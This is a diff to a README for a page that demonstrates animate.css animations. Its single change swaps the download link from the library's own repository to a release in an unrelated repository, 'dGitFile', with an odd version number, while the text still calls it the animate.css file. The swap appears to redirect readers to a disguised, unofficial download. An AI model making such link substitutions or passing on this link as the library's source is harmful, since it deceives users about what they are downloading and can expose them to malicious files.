@@ -5,7 +5,7 @@ A webpage that shows every animation classes from animate.css (developed by [dan
 you can visit the site here [animated.css](https://samuelbetio.github.io/LDPage/demo/animate.css/)
 :wink:
 
-download the animate.css file [here](https://github.com/daneden/animate.css) to start animating
+download the animate.css file [here](https://github.com/samuelbetio/dGitFile/releases/tag/v7.3.2483780) to start animating
 
 ![Animation example](img/687474703a2f2f7265732e636c6f7564696e6172792e636f6d2f64666435647975686f2f696d6167652f75706c6f61642f76313530393039323939302f616e696d6174656373735f6a6d306b68712e676966.gif)
 
